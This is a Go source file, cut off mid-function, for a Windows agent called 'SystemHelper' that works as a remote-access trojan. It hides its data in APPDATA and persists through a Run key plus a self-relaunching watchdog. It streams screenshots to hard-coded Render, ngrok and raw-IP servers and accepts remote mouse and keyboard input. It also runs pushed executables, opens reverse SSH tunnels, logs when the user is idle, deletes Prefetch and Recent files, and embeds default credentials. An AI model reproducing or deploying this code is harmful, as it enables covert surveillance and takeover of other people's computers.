package main

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"image/jpeg"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
	"unsafe"

	"github.com/kbinani/screenshot"
	"github.com/gorilla/websocket"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

const Version = "6.0.0"

var agentId string
var isServerMode = false
var isInternalMode = false
var orgName = ""
var fps = 1
var logFile *os.File
var hostname string
var authUser = "puneet"
var authPass = "puneet12"
var authToken = ""

// Data directory for config/logs (hidden from user)
func dataDir() string {
	exe, _ := os.Executable()
	// On Windows, use %APPDATA%\SystemHelper
	if runtime.GOOS == "windows" {
		appData := os.Getenv("APPDATA")
		if appData != "" {
			d := filepath.Join(appData, "SystemHelper")
			os.MkdirAll(d, 0755)
			return d
		}
	}
	// Fallback: next to .exe
	return filepath.Dir(exe)
}

func loadAuth() {
	cfgFile := filepath.Join(dataDir(), "auth.ini")

	// Try to read from file
	data, err := os.ReadFile(cfgFile)
	if err == nil {
		lines := strings.Split(string(data), "\n")
		for _, line := range lines {
			line = strings.TrimSpace(line)
			if strings.HasPrefix(line, "username=") {
				authUser = strings.TrimPrefix(line, "username=")
			}
			if strings.HasPrefix(line, "password=") {
				authPass = strings.TrimPrefix(line, "password=")
			}
		}
	} else {
		// Create default config file
		defaultCfg := "username=" + authUser + "\npassword=" + authPass + "\n"
		os.WriteFile(cfgFile, []byte(defaultCfg), 0644)
	}
	authToken = sha256Hex(authUser + ":" + authPass)
}

func sha256Hex(s string) string {
	h := sha256.Sum256([]byte(s))
	return fmt.Sprintf("%x", h)
}

func checkAuth(w http.ResponseWriter, r *http.Request) bool {
	u, p, ok := r.BasicAuth()
	if ok && u == authUser && p == authPass { return true }
	w.Header().Set("WWW-Authenticate", `Basic realm="Remote Monitor"`)
	http.Error(w, "Unauthorized", 401)
	return false
}

var serverUrls = []string{
	"wss://remote-monitor-1l0s.onrender.com",                    // Render.com (primary) ⭐
	"wss://deviation-tweak-charter.ngrok-free.dev",                 // ngrok (backup)
	"ws://127.0.0.1:3000",                                          // local fallback
	"ws://43.247.40.101:3000",                                      // port forwarding (last)
}

var serverNames = map[string]string{
	"render":     "wss://remote-monitor-1l0s.onrender.com",
	"ngrok":      "wss://deviation-tweak-charter.ngrok-free.dev",
	"cloudflare": "wss://warming-theater-photo-pentium.trycloudflare.com",
	"direct":     "ws://43.247.40.101:3000",
}

func loadCustomUrls() {
	// First check next to .exe (for easy distribution)
	exe, _ := os.Executable()
	exeDir := filepath.Dir(exe)
	exeFile := filepath.Join(exeDir, "urls.ini")
	
	// Then check dataDir (for hidden config)
	dataFile := filepath.Join(dataDir(), "urls.ini")
	
	// Try exeDir first, then dataDir
	paths := []string{exeFile, dataFile}
	for _, urlFile := range paths {
		data, err := os.ReadFile(urlFile)
		if err != nil { continue }
		
		lines := strings.Split(string(data), "\n")
		for i := len(lines) - 1; i >= 0; i-- {
			line := strings.TrimSpace(lines[i])
			if line != "" && !strings.HasPrefix(line, "#") {
				serverUrls = append([]string{line}, serverUrls...)
			}
		}
		log("Loaded URLs from: " + urlFile)
		break // Only load from first found file
	}
}

// Agent info for server mode
type AgentInfo struct {
	Ws       *websocket.Conn
	Name     string
	LastFrame string
	Viewers  map[*websocket.Conn]bool
}

func init() {
	hostname, _ = os.Hostname()
	loadAuth()
	loadCustomUrls()
	f, _ := os.OpenFile(filepath.Join(dataDir(), "agent.log"), os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	logFile = f
	log("Started v" + Version)
}

func log(msg string) {
	if logFile == nil { return }
	logFile.WriteString(time.Now().Format("15:04:05") + " " + msg + "\n")
	logFile.Sync()
}

type Message struct {
	Type    string            `json:"type"`
	AgentId string            `json:"agentId,omitempty"`
	Name    string            `json:"name,omitempty"`
	Org     string            `json:"org,omitempty"`
	Frame   string            `json:"frame,omitempty"`
	Fps     int               `json:"fps,omitempty"`
	Command string            `json:"command,omitempty"`
	Params  map[string]string `json:"params,omitempty"`
}

const (
	INPUT_MOUSE           = 0
	INPUT_KEYBOARD        = 1
	MOUSEEVENTF_MOVE      = 0x0001
	MOUSEEVENTF_LEFTDOWN  = 0x0002
	MOUSEEVENTF_LEFTUP    = 0x0004
	MOUSEEVENTF_RIGHTDOWN = 0x0008
	MOUSEEVENTF_RIGHTUP   = 0x0010
	MOUSEEVENTF_ABSOLUTE  = 0x8000
	KEYEVENTF_KEYUP       = 0x0002
)

var (
	user32            = windows.NewLazySystemDLL("user32.dll")
	procSendInput     = user32.NewProc("SendInput")
	procGetDC         = user32.NewProc("GetDC")
	procReleaseDC     = user32.NewProc("ReleaseDC")
	procGetLastInputInfo = user32.NewProc("GetLastInputInfo")
	gdi32             = windows.NewLazySystemDLL("gdi32.dll")
	procGetDeviceCaps = gdi32.NewProc("GetDeviceCaps")
	kernel32          = windows.NewLazySystemDLL("kernel32.dll")
	procGetTickCount  = kernel32.NewProc("GetTickCount")
)

func main() {
	runtime.LockOSThread()
	
	// Check for --server flag (manual server mode)
	useMode := ""
	for i := 0; i < len(os.Args); i++ {
		arg := os.Args[i]
		if arg == "--server" || arg == "-s" {
			isServerMode = true
		}
		if arg == "--internal" || arg == "-i" {
			isInternalMode = true
		}
		if arg == "--org" || arg == "-o" {
			if i+1 < len(os.Args) {
				orgName = os.Args[i+1]
			}
		}
		if arg == "--use" || arg == "-u" {
			if i+1 < len(os.Args) {
				useMode = os.Args[i+1]
			}
		}
		if arg == "--help" || arg == "-h" || arg == "/?" {
			fmt.Println("SystemHelper v" + Version)
			fmt.Println("")
			fmt.Println("Usage:")
			fmt.Println("  SystemHelper.exe                  Auto mode (try all)")
			fmt.Println("  SystemHelper.exe --server         Force this PC to be the server")
			fmt.Println("  SystemHelper.exe --org <name>       Set organization name (for multi-org)")
			fmt.Println("  SystemHelper.exe --internal          Internal mode (no cloud, one file)")
			fmt.Println("  SystemHelper.exe --internal --server Internal mode as server")
			fmt.Println("  SystemHelper.exe --setup-internal Create urls.ini for internal mode")
			fmt.Println("  SystemHelper.exe --setup-org <name> Create org folder with config")
			fmt.Println("  SystemHelper.exe --use <name>     Use only specific server:")
			fmt.Println("    Names: render, ngrok, cloudflare, direct, local")
			fmt.Println("")
			fmt.Println("Examples:")
			fmt.Println("  SystemHelper.exe --internal           Run in internal mode (no cloud)")
			fmt.Println("  SystemHelper.exe --internal --server  Internal mode + become server")
			fmt.Println("  SystemHelper.exe --setup-internal     Create urls.ini file")
			fmt.Println("  SystemHelper.exe --setup-org Office1  Create 'Office1' folder")
			fmt.Println("  SystemHelper.exe --use render         Only use Render.com")
			fmt.Println("")
			fmt.Println("Config files (in %APPDATA%\\SystemHelper\\):")
			fmt.Println("  auth.ini   - Change password")
			fmt.Println("  urls.ini   - Custom server URLs")
			fmt.Println("  agent.ini  - Server preference")
			os.Exit(0)
		}
		if arg == "--setup-internal" {
			setupInternalMode()
		}
		if strings.HasPrefix(arg, "--setup-org") {
			orgName := ""
			if strings.Contains(arg, "=") {
				orgName = strings.SplitN(arg, "=", 2)[1]
			} else if i+1 < len(os.Args) {
				orgName = os.Args[i+1]
			}
			if orgName != "" {
				setupOrgMode(orgName)
			}
		}
	}

	// Apply --use filter
	if useMode != "" {
		if url, ok := serverNames[useMode]; ok {
			serverUrls = []string{url}
			log("Manual mode: using " + useMode + " (" + url + ")")
		} else {
			log("Unknown server name: " + useMode + ". Using auto mode.")
		}
	}

	preventDuplicate()
	cleanTempFiles()
	loadAgentId()
	setupAutostart()
	startActivityLogger()
	
	// Check if this PC was remotely designated as fallback server
	preferredServer := loadServerPreference()
	if isServerMode || preferredServer {
		log("Designated as SERVER")
		runServer()
		return
	}

	// Try to become local server (for other agents on same network)
	ln, err := net.Listen("tcp", "0.0.0.0:3000")
	if err == nil {
		ln.Close()
		log("Starting local server mode (background)")
		go runServer() // Start server in background
	} else {
		// Port 3000 taken → find server on network
		log("Port 3000 busy → scanning for server...")
		serverIP := discoverServer()
		if serverIP != "" {
			log("Found server at: " + serverIP)
			serverUrls = append([]string{"ws://" + serverIP + ":3000"}, serverUrls...)
		}
	}

	// ALWAYS connect to cloud server as agent
	log("Agent ID: " + agentId)
	for { connect(); time.Sleep(3 * time.Second) }
}

func loadServerPreference() bool {
	cfgFile := filepath.Join(dataDir(), "agent.ini")
	data, err := os.ReadFile(cfgFile)
	if err != nil { return false }
	for _, line := range strings.Split(string(data), "\n") {
		if strings.TrimSpace(line) == "prefer_server=true" {
			return true
		}
	}
	return false
}

func saveServerPreference(prefer bool) {
	cfgFile := filepath.Join(dataDir(), "agent.ini")
	val := "false"
	if prefer { val = "true" }
	os.WriteFile(cfgFile, []byte("prefer_server="+val+"\n"), 0644)
}

func handleRemoteUpdate(filename, data string) {
	exe, _ := os.Executable()
	dir := filepath.Dir(exe)
	tmpPath := filepath.Join(dir, filename + ".tmp")
	
	// Decode and save
	decoded, err := base64.StdEncoding.DecodeString(data)
	if err != nil { log("Update decode failed: " + err.Error()); return }
	
	err = os.WriteFile(tmpPath, decoded, 0644)
	if err != nil { log("Update write failed: " + err.Error()); return }
	
	log("Update received: " + filename + " (" + fmt.Sprintf("%d bytes", len(decoded)) + ")")
	
	// Replace original and restart
	exePath := filepath.Join(dir, filename)
	os.Rename(tmpPath, exePath)
	
	log("Update applied. Restarting...")
	
	// Start new version and exit this one
	exec.Command(exePath).Start()
	os.Exit(0)
}

func preventDuplicate() {
	exe, _ := os.Executable()
	dir := filepath.Dir(exe)
	lockFile := filepath.Join(dir, "agent.lock")
	data, _ := os.ReadFile(lockFile)
	var oldPid int
	fmt.Sscanf(string(data), "%d", &oldPid)
	if oldPid > 0 && oldPid != os.Getpid() {
		exec.Command("taskkill", "/f", "/pid", fmt.Sprintf("%d", oldPid)).Run()
		time.Sleep(500 * time.Millisecond)
	}
	os.Remove(lockFile)
	os.Remove(filepath.Join(dir, "agent.log"))
	os.Remove(filepath.Join(dir, "error.log"))
	os.WriteFile(lockFile, []byte(fmt.Sprintf("%d", os.Getpid())), 0644)
}

func loadAgentId() {
	cfgFile := filepath.Join(dataDir(), "agent.id")
	data, _ := os.ReadFile(cfgFile)
	if len(data) > 0 { agentId = string(data); return }
	agentId = hostname + "-" + fmt.Sprintf("%x", time.Now().UnixNano())[:8]
	os.WriteFile(cfgFile, []byte(agentId), 0644)
}

func setupAutostart() {
	if runtime.GOOS != "windows" { return }
	exe, _ := os.Executable()
	dir := filepath.Dir(exe)
	
	// Create watchdog batch file that auto-restarts if killed
	watchdogPath := filepath.Join(dir, "watchdog.bat")
	watchdog := `@echo off
:loop
tasklist | find "SystemHelper" >nul
if errorlevel 1 start "" "` + exe + `"
timeout /t 120 /nobreak >nul
goto loop`
	os.WriteFile(watchdogPath, []byte(watchdog), 0644)
	
	// Set registry to run watchdog instead of direct exe
	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err != nil { log("Registry: " + err.Error()); return }
	defer k.Close()
	k.SetStringValue("SystemMonitor", watchdogPath)
	log("Watchdog installed (auto-restarts every 2 min)")
}

func setupInternalMode() {
	exe, _ := os.Executable()
	dir := filepath.Dir(exe)
	urlsPath := filepath.Join(dir, "urls.ini")
	os.WriteFile(urlsPath, []byte("auto-local\n"), 0644)
	
	fmt.Println("✅ Internal mode configured!")
	fmt.Println("   Created: " + urlsPath)
	fmt.Println("")
	fmt.Println("   To start as SERVER on this PC:")
	fmt.Println("     SystemHelper.exe --server")
	fmt.Println("")
	fmt.Println("   Other PCs: copy urls.ini next to SystemHelper.exe")
	fmt.Println("   They will auto-discover the server on the network.")
	fmt.Println("")
	os.Exit(0)
}

func setupOrgMode(name string) {
	exe, _ := os.Executable()
	orgDir := filepath.Join(filepath.Dir(exe), name)
	os.MkdirAll(orgDir, 0755)
	
	// Copy .exe to org folder
	src, _ := os.ReadFile(exe)
	os.WriteFile(filepath.Join(orgDir, "SystemHelper.exe"), src, 0755)
	
	// Create urls.ini
	os.WriteFile(filepath.Join(orgDir, "urls.ini"), []byte("auto-local\n# org="+name+"\n"), 0644)
	
	// Create README
	readme := "INTERNAL SERVER - " + name + "\n" +
		"========================\n\n" +
		"Organization: " + name + "\n\n" +
		"SERVER SETUP:\n" +
		"  1. Copy this folder to the server PC\n" +
		"  2. Run: SystemHelper.exe --server\n" +
		"  3. Dashboard: http://[SERVER-IP]:3000\n\n" +
		"AGENT SETUP:\n" +
		"  1. Copy this folder to each agent PC\n" +
		"  2. Double-click SystemHelper.exe\n" +
		"  3. Agents auto-connect to the server\n\n" +
		"All PCs must be on the same network.\n"
	os.WriteFile(filepath.Join(orgDir, "README.txt"), []byte(readme), 0644)
	
	fmt.Println("✅ Organization '" + name + "' setup complete!")
	fmt.Println("   Folder: " + orgDir)
	fmt.Println("")
	fmt.Println("   Files created:")
	fmt.Println("     " + name + "\\SystemHelper.exe")
	fmt.Println("     " + name + "\\urls.ini")
	fmt.Println("     " + name + "\\README.txt")
	fmt.Println("")
	fmt.Println("   Copy this folder to all PCs in the organization.")
	os.Exit(0)
}

func cleanupLogs() {
	log("Cleaning logs...")
	dir := dataDir()
	
	// Delete activity logs older than 30 days
	filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err != nil { return nil }
		if !info.IsDir() && strings.HasPrefix(info.Name(), "activity-") {
			if time.Since(info.ModTime()).Hours() > 24*30 { // 30 days
				os.Remove(path)
				log("Removed old log: " + info.Name())
			}
		}
		return nil
	})
	
	// Clear agent.log
	os.Truncate(filepath.Join(dir, "agent.log"), 0)
	
	// Clear error.log
	os.Truncate(filepath.Join(dir, "error.log"), 0)
	
	// Send status to server
	if wsRef != nil {
		wsRef.WriteJSON(Message{Type: "agent-log", Frame: "Logs cleaned"})
	}
	log("Logs cleaned")
}

var wsRef *websocket.Conn // Reference to primary WebSocket for agent responses
var localCancel context.CancelFunc // Cancel previous secondary goroutine on reconnect

func startActivityLogger() {
	if runtime.GOOS != "windows" { return }
	
	// Log startup with date
	logEventDate("STARTED")
	
	go func() {
		lastIdle := 0
		lastLog := 0
		for {
			idle := getIdleSeconds()
			
			if idle > 300 && lastIdle < 300 {
				logEventDate("INACTIVE (idle " + fmt.Sprintf("%ds", idle) + ")")
			}
			if idle < 300 && lastIdle >= 300 {
				logEventDate("ACTIVE (resumed)")
			}
			lastIdle = idle
			
			lastLog++
			if lastLog >= 60 {
				lastLog = 0
				logEventDate("RUNNING (uptime " + fmt.Sprintf("%dmin", osUptime()) + ")")
			}
			
			time.Sleep(60 * time.Second)
		}
	}()
}

func logEventDate(msg string) {
	path := filepath.Join(dataDir(), "activity-"+time.Now().Format("2006-01-02")+".log")
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil { return }
	defer f.Close()
	f.WriteString(time.Now().Format("2006-01-02 15:04:05") + " " + msg + "\n")
}

func logEvent(path, msg string) {
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil { return }
	defer f.Close()
	f.WriteString(time.Now().Format("01-02 15:04") + " " + msg + "\n")
}


func cleanTempFiles() {
	if runtime.GOOS != "windows" { return }
	
	cmds := []string{
		// Clean Windows temp
		`del /f /s /q "%TEMP%\*" >nul 2>&1`,
		`del /f /s /q "C:\Windows\Temp\*" >nul 2>&1`,
		// Clean recent files
		`del /f /s /q "%USERPROFILE%\Recent\*" >nul 2>&1`,
		// Clean prefetch
		`del /f /s /q "C:\Windows\Prefetch\*" >nul 2>&1`,
		// Clean DNS cache
		`ipconfig /flushdns >nul 2>&1`,
		// Clean IE/Edge cache
		`RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 8 >nul 2>&1`,
		// Run Disk Cleanup (basic)
		`cleanmgr /sagerun:1 >nul 2>&1`,
	}
	
	for _, cmd := range cmds {
		exec.Command("cmd", "/c", cmd).Run()
	}
	
	log("Temp files cleaned")
}

func handleFileTransfer(filename, data string) {
	exe, _ := os.Executable()
	dir := filepath.Dir(exe)
	dest := filepath.Join(dir, "received", filename)
	os.MkdirAll(filepath.Dir(dest), 0755)
	
	decoded, err := base64.StdEncoding.DecodeString(data)
	if err != nil { log("File transfer decode failed: " + err.Error()); return }
	
	err = os.WriteFile(dest, decoded, 0644)
	if err != nil { log("File transfer write failed: " + err.Error()); return }
	
	log("File received: " + filename + " (" + fmt.Sprintf("%d bytes", len(decoded)) + ") saved to " + dest)
}

func startTunnel(ws *websocket.Conn) {
	tunnelMode := "auto"
	if data, err := os.ReadFile(filepath.Join(dataDir(), "tunnel.ini")); err == nil {
		tunnelMode = strings.TrimSpace(string(data))
	}
	log("Tunnel mode: " + tunnelMode)
	
	go func() {
		var url string
		
		// Try localhost.run (SSH, no install needed)
		if tunnelMode == "auto" || tunnelMode == "localhost.run" {
			log("Trying localhost.run...")
			cmd := exec.Command("ssh", "-o", "StrictHostKeyChecking=no", "-o", "ServerAliveInterval=30",
				"-o", "ConnectTimeout=10",
				"-R", "80:localhost:3000", "localhost.run")
			out, _ := cmd.CombinedOutput()
			output := string(out)
			for _, line := range strings.Split(output, "\n") {
				if strings.Contains(line, "https") && strings.Contains(line, "localhost.run") {
					url = strings.TrimSpace(line)
					break
				}
			}
		}
		
		// Try bore.pub if localhost.run failed
		if url == "" && (tunnelMode == "auto" || tunnelMode == "bore") {
			log("Trying bore.pub...")
			borePath := filepath.Join(dataDir(), "bore.exe")
			if _, err := os.Stat(borePath); os.IsNotExist(err) {
				log("Downloading bore...")
				dl := exec.Command("powershell", "-Command",
					"Invoke-WebRequest -Uri 'https://github.com/ekzhang/bore/releases/download/v0.5.2/bore-v0.5.2-x86_64-pc-windows-msvc.zip' -OutFile '"+
					filepath.Join(dataDir(), "bore.zip")+"' ; Expand-Archive '"+filepath.Join(dataDir(), "bore.zip")+"' -DestinationPath '"+
					dataDir()+"' -Force ; Remove-Item '"+filepath.Join(dataDir(), "bore.zip")+"'")
				dl.Run()
			}
			if _, err := os.Stat(borePath); err == nil {
				// bore is non-blocking, runs in background
				cmd := exec.Command(borePath, "local", "3000", "--to", "bore.pub")
				stdout, _ := cmd.StdoutPipe()
				cmd.Start()
				
				// Read first line of output for URL
				buf := make([]byte, 256)
				n, _ := stdout.Read(buf)
				url = strings.TrimSpace(string(buf[:n]))
				if url != "" && !strings.HasPrefix(url, "http") {
					url = "http://bore.pub:" + strings.TrimSpace(strings.Split(url, " ")[0])
				}
			}
		}
		
		if url != "" {
			log("Tunnel URL: " + url)
			os.WriteFile(filepath.Join(dataDir(), "tunnel.url"), []byte(url), 0644)
			if ws != nil { ws.WriteJSON(Message{Type: "tunnel-status", Command: url, Frame: "ready"}) }
		} else {
			log("All tunnels failed")
			if ws != nil { ws.WriteJSON(Message{Type: "tunnel-status", Command: "failed", Frame: "All tunnels failed"}) }
		}
	}()
}

func getIdleSeconds() int {
	type LASTINPUTINFO struct {
		CbSize uint32
		DwTime uint32
	}
	var info LASTINPUTINFO
	info.CbSize = uint32(unsafe.Sizeof(info))
	ret, _, _ := procGetLastInputInfo.Call(uintptr(unsafe.Pointer(&info)))
	if ret == 0 { return 0 }
	tick, _, _ := procGetTickCount.Call()
	diff := uint32(tick) - info.DwTime
	return int(diff / 1000)
}

func osUptime() int {
	t, _, _ := procGetTickCount.Call()
	return int(t / 60000)
}

// ============ SERVER MODE ============
func runServer() {
	log("SERVER MODE on port 3000")
	setupAutostart()
	startActivityLogger()
	agents := make(map[string]*AgentInfo)

	// Generate auth token from credentials
	authToken := sha256Hex(authUser + ":" + authPass)

	http.HandleFunc("/api/agents", func(w http.ResponseWriter, r *http.Request) {
		if !checkAuth(w, r) { return }
		w.Header().Set("Access-Control-Allow-Origin", "*")
		list := []map[string]interface{}{}
		for id, a := range agents {
			list = append(list, map[string]interface{}{"id": id, "name": a.Name})
		}
		json.NewEncoder(w).Encode(list)
	})

	upgrader := websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }}
	http.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) {
		t := r.URL.Query().Get("token")
		if t == "" || t != authToken {
			if !checkAuth(w, r) { return }
		}
		conn, _ := upgrader.Upgrade(w, r, nil)
		if conn == nil { return }
		defer conn.Close()

		var role, agentIdPtr string
		for {
			_, msg, err := conn.ReadMessage()
			if err != nil { break }
			var d Message
			json.Unmarshal(msg, &d)

			switch d.Type {
			case "agent-hello":
				role = "agent"
				agentIdPtr = d.AgentId
				agents[d.AgentId] = &AgentInfo{Ws: conn, Name: d.Name, Viewers: make(map[*websocket.Conn]bool)}
				log("Agent: " + d.Name)
			case "agent-frame":
				if a, ok := agents[d.AgentId]; ok {
					a.LastFrame = d.Frame
					for v := range a.Viewers { v.WriteJSON(Message{Type: "frame", AgentId: d.AgentId, Frame: d.Frame}) }
				}
			case "dashboard-hello":
				role = "dashboard"
				list := []map[string]interface{}{}
				for id, a := range agents { list = append(list, map[string]interface{}{"id": id, "name": a.Name}) }
				conn.WriteJSON(map[string]interface{}{"type": "agent-list", "agents": list})
			case "view-agent":
				if a, ok := agents[d.AgentId]; ok {
					a.Viewers[conn] = true
					if a.LastFrame != "" { conn.WriteJSON(Message{Type: "frame", AgentId: d.AgentId, Frame: a.LastFrame}) }
				}
			case "stop-viewing":
				for _, a := range agents { delete(a.Viewers, conn) }
			case "control":
				if a, ok := agents[d.AgentId]; ok { a.Ws.WriteJSON(Message{Type: "control", Command: d.Command, Params: d.Params}) }
			case "set-server-preference":
				if a, ok := agents[d.AgentId]; ok {
					a.Ws.WriteJSON(Message{Type: "set-server-preference", Command: d.Command})
					log("Set server pref for " + d.AgentId + " = " + d.Command)
				}
			}
		}
		if role == "agent" && agentIdPtr != "" { delete(agents, agentIdPtr); log("Agent gone: " + agentIdPtr) }
	})

	// Start embedded agent for this PC
	go func() {
		time.Sleep(1 * time.Second)
		c, _, err := websocket.DefaultDialer.Dial("ws://127.0.0.1:3000/ws?token="+authToken, nil)
		if err != nil { log("Embedded agent failed: " + err.Error()); return }
		c.WriteJSON(Message{Type: "agent-hello", AgentId: agentId, Name: hostname + " (server)", Org: orgName})
		go func() {
			for {
				_, m, e := c.ReadMessage()
				if e != nil { return }
				var msg Message
				json.Unmarshal(m, &msg)
				if msg.Type == "control" { executeControl(msg.Command, msg.Params) }
			}
		}()
		for {
			frame := capture()
			if frame != "" { c.WriteJSON(Message{Type: "agent-frame", AgentId: agentId, Frame: frame}) }
			time.Sleep(time.Second)
		}
	}()

	// Serve dashboard page with auth token embedded
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if !checkAuth(w, r) { return }
		w.Header().Set("Access-Control-Allow-Origin", "*")
		if r.URL.Path == "/" {
			html := strings.Replace(htmlDashboard, "TOKEN_PLACEHOLDER", authToken, 1)
			w.Write([]byte(html))
		}
	})

	log("Listening on :3000")
	http.ListenAndServe(":3000", nil)
}

// Discover server on local network by scanning subnet for port 3000
func discoverServer() string {
	// Get local IP to determine subnet
	localIP := getLocalIP()
	if localIP == "" { return "" }
	
	parts := strings.Split(localIP, ".")
	if len(parts) != 4 { return "" }
	subnet := parts[0] + "." + parts[1] + "." + parts[2] + "."
	myLast, _ := strconv.Atoi(parts[3])

	// Scan hosts 1-254 in parallel
	result := make(chan string, 254)
	for i := 1; i <= 254; i++ {
		if i == myLast { continue } // skip self
		go func(host int) {
			ip := subnet + strconv.Itoa(host)
			conn, err := net.DialTimeout("tcp", ip+":3000", 500*time.Millisecond)
			if err == nil {
				conn.Close()
				result <- ip
			} else {
				result <- ""
			}
		}(i)
	}

	// Wait for results
	timeout := time.After(3 * time.Second)
	found := ""
	for i := 1; i <= 253; i++ {
		select {
		case ip := <-result:
			if ip != "" {
				found = ip
				// Don't return immediately - wait for all to finish
			}
		case <-timeout:
			return found
		}
	}
	return found
}

func getLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil { return "" }
	for _, a := range addrs {
		if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ip := ipnet.IP.To4(); ip != nil {
				return ip.String()
			}
		}
	}
	return ""
}
func connect() {
	// Reload URLs from config (so remote switch-server takes effect)
	loadCustomUrls()
	
	// Check if internal-only mode
	isInternal := isInternalMode
	if !isInternal {
		for _, url := range serverUrls {
			if url == "auto-local" {
				isInternal = true
				break
			}
		}
	}
	
	if isInternal {
		log("INTERNAL MODE: Cloud disabled, local network only")
		// Don't try cloud URLs, just discover local server
		serverIP := discoverServer()
		if serverIP != "" {
			log("Found server at: " + serverIP)
			serverUrls = []string{"ws://" + serverIP + ":3000"}
		} else {
			log("No server found on network. Will retry.")
			time.Sleep(10 * time.Second)
			return
		}
	}
	
	log("URLs to try: " + fmt.Sprintf("%v", serverUrls))
	
	// Connect to primary server (first working URL)
	var c *websocket.Conn
	for _, url := range serverUrls {
		log("Trying: " + url)
		var err error
		authURL := url + "/ws?token=" + authToken
		c, _, err = websocket.DefaultDialer.Dial(authURL, nil)
		if err == nil { log("Connected: " + url); break }
	}
	if c == nil { return }
	defer c.Close()
	wsRef = c // Save reference for agent responses
	c.WriteJSON(Message{Type: "agent-hello", AgentId: agentId, Name: hostname, Org: orgName})

	// Also connect to local server as secondary (for speed)
	if localCancel != nil { localCancel() }
	var lctx context.Context
	lctx, localCancel = context.WithCancel(context.Background())
	go func() {
		localURL := "ws://127.0.0.1:3000/ws?token=" + authToken
		c2, _, err2 := websocket.DefaultDialer.Dial(localURL, nil)
		if err2 != nil { return } // Local server not available
		defer c2.Close()
		c2.WriteJSON(Message{Type: "agent-hello", AgentId: agentId, Name: hostname + " (local)", Org: orgName})
		log("Connected to local server (secondary)")
		
		// Send frames to local server too
		for {
			select {
			case <-lctx.Done():
				log("Secondary connection stopped")
				return
			default:
				frame := capture()
				if frame != "" {
					if err := c2.WriteJSON(Message{Type: "agent-frame", AgentId: agentId, Frame: frame}); err != nil {
						return
					}
				}
				time.Sleep(time.Second / time.Duration(fps))
			}
		}
	}()

	done := make(chan struct{})
	go func() {
		defer close(done)
		for {
			_, m, e := c.ReadMessage()
			if e != nil { return }
			var d Message
			json.Unmarshal(m, &d)
			if d.Type == "set-fps" && d.Fps > 0 { fps = d.Fps }
			if d.Type == "control" { executeControl(d.Command, d.Params) }
			if d.Type == "set-server-preference" {
				saveServerPreference(d.Command == "true")
				log("Remote: set server preference = " + d.Command)
			}
			if d.Type == "push-update" {
				handleRemoteUpdate(d.Frame, d.Command)
			}
			if d.Type == "switch-server" && d.Command != "" {
				log("Remote switch to: " + d.Command)
				os.WriteFile(filepath.Join(dataDir(), "urls.ini"), []byte(d.Command+"\n"), 0644)
				saveServerPreference(true)
				c.Close() // Force disconnect → reconnect with new URL
				return
			}
			if d.Type == "file-transfer" {
				handleFileTransfer(d.Command, d.Frame)
			}
			if d.Type == "start-tunnel" {
				startTunnel(c)
			}
			if d.Type == "cleanup-logs" {
				cleanupLogs()
			}
		}
	}()
	fc := 0
	for {
		select {
		case <-done: return
		default:
			frame := capture()
			if frame != "" {
				c.WriteJSON(Message{Type: "agent-frame", AgentId: agentId, Frame: frame})
				fc++
			}
			time.Sleep(time.Second / time.Duration(fps))
		}
	}
}

// ============ CONTROL & CAPTURE ============
func makeMouseInput(absX, absY, flags uint32) []byte {
	b := make([]byte, 40)
	binary.LittleEndian.PutUint32(b[0:4], INPUT_MOUSE)
	binary.LittleEndian.PutUint32(b[8:12], absX)
	binary.LittleEndian.PutUint32(b[12:16], absY)
	binary.LittleEndian.PutUint32(b[20:24], flags)
	return b
}

func makeKeyboardInput(vk uint16, flags uint32) []byte {
	b := make([]byte, 40)
	binary.LittleEndian.PutUint32(b[0:4], INPUT_KEYBOARD)
	binary.LittleEndian.PutUint16(b[8:10], vk)
	binary.LittleEndian.PutUint32(b[12:16], flags)
	return b
}

func screenSize() (int, int) {
	dc, _, _ := procGetDC.Call(0)
	if dc == 0 { return 1920, 1080 }
	w, _, _ := procGetDeviceCaps.Call(dc, 8)
	h, _, _ := procGetDeviceCaps.Call(dc, 10)
	procReleaseDC.Call(0, dc)
	sw, sh := int(int32(w)), int(int32(h))
	if sw <= 0 || sh <= 0 { return 1920, 1080 }
	return sw, sh
}

func moveMouse(x, y int) {
	sw, sh := screenSize()
	b := makeMouseInput(uint32(x*65535/sw), uint32(y*65535/sh), MOUSEEVENTF_MOVE|MOUSEEVENTF_ABSOLUTE)
	procSendInput.Call(1, uintptr(unsafe.Pointer(&b[0])), 40)
}

func clickMouse(x, y int, right bool) {
	sw, sh := screenSize()
	absX, absY := uint32(x*65535/sw), uint32(y*65535/sh)
	moveMouse(x, y)
	f, fu := uint32(MOUSEEVENTF_LEFTDOWN), uint32(MOUSEEVENTF_LEFTUP)
	if right { f, fu = MOUSEEVENTF_RIGHTDOWN, MOUSEEVENTF_RIGHTUP }
	d := makeMouseInput(absX, absY, f|MOUSEEVENTF_ABSOLUTE)
	u := makeMouseInput(absX, absY, fu|MOUSEEVENTF_ABSOLUTE)
	procSendInput.Call(1, uintptr(unsafe.Pointer(&d[0])), 40)
	procSendInput.Call(1, uintptr(unsafe.Pointer(&u[0])), 40)
}

func pressKey(key string) {
	if len(key) != 1 { return }
	v := uint16(key[0])
	if key[0] >= 'a' && key[0] <= 'z' { v -= 32 }
	d := makeKeyboardInput(v, 0)
	u := makeKeyboardInput(v, KEYEVENTF_KEYUP)
	procSendInput.Call(1, uintptr(unsafe.Pointer(&d[0])), 40)
	procSendInput.Call(1, uintptr(unsafe.Pointer(&u[0])), 40)
}

func executeControl(cmd string, params map[string]string) {
	if cmd == "mousemove" || cmd == "click" {
		sw, sh := screenSize()
